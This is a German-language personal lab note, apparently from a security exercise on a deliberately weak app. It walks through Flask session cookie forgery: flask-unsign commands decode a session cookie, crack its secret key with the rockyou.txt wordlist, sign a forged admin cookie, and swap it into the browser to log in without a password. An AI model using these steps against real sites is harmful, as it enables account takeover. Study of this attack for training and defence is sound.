tags: 
links: [[401-Worst-App]]

Tool installieren
```bash
pip install flask-unsign --break-system-packages
```

![[000001-flask-session-cookie-forgery.png]]

![[000002-flask-session-cookie-forgery.png]]


Echtes Cookie finden (aus Browser Dev-Tools → Application → Cookies → `session`)

![[000003-flask-session-cookie-forgery.png]]

![[000004-flask-session-cookie-forgery.png]]

![[000005-flask-session-cookie-forgery.png]]

![[000006-flask-session-cookie-forgery.png]]

![[000007-flask-session-cookie-forgery.png]]

![[000008-flask-session-cookie-forgery.png]]

![[000009-flask-session-cookie-forgery.png]]

![[000010-flask-session-cookie-forgery.png]]

![[000010-flask-session-cookie-forgery.png]]

![[000012-flask-session-cookie-forgery.png]]

Echtes Cookie auslesen
```bash
flask-unsign --decode --cookie "eyJ1c2VybmFtZSI6ImFsaWNlIn0..."
# Output: {'user_id': 2, 'username': 'alice'}
```

![[000020-flask-session-cookie-forgery.png]]

![[000021-flask-session-cookie-forgery.png]]

![[000022-flask-session-cookie-forgery.png]]

![[000023-flask-session-cookie-forgery.png]]

"rockyou.txt" herunterladen

![[000013-flask-session-cookie-forgery.png]]

![[000014-flask-session-cookie-forgery.png]]

![[000015-flask-session-cookie-forgery.png]]

![[000016-flask-session-cookie-forgery.png]]

![[000017-flask-session-cookie-forgery.png]]

![[000018-flask-session-cookie-forgery.png]]

![[000019-flask-session-cookie-forgery.png]]



Key cracken
```bash
flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6ImFsaWNlIn0..." --wordlist rockyou.txt
# Output: Secret key found: 1234  ✅
```

![[000024-flask-session-cookie-forgery.png]]

![[000025-flask-session-cookie-forgery.png]]

Gefälschte Session erstellen – z.B. als `admin` mit `user_id=1`
```bash
flask-unsign --sign --secret "1234" --cookie "{'user_id': 1, 'username': 'admin'}"
# Output: eyJ1c2VybmFtZSI6ImFkbWluIn0.ZxYz...  ← gefälschtes Cookie
```

![[000026-flask-session-cookie-forgery.png]]

![[000027-flask-session-cookie-forgery.png]]

![[000028-flask-session-cookie-forgery.png]]

Gefälschtes Cookie im Browser einsetzen: Dev-Tools → Application → Cookies → `session`-Wert ersetzen → Seite neu laden → **eingeloggt als admin, ohne Passwort!**

![[000029-flask-session-cookie-forgery.png]]

![[000030-flask-session-cookie-forgery.png]]

![[000031-flask-session-cookie-forgery.png]]

![[000032-flask-session-cookie-forgery.png]]

![[000033-flask-session-cookie-forgery.png]]









Sources
[]()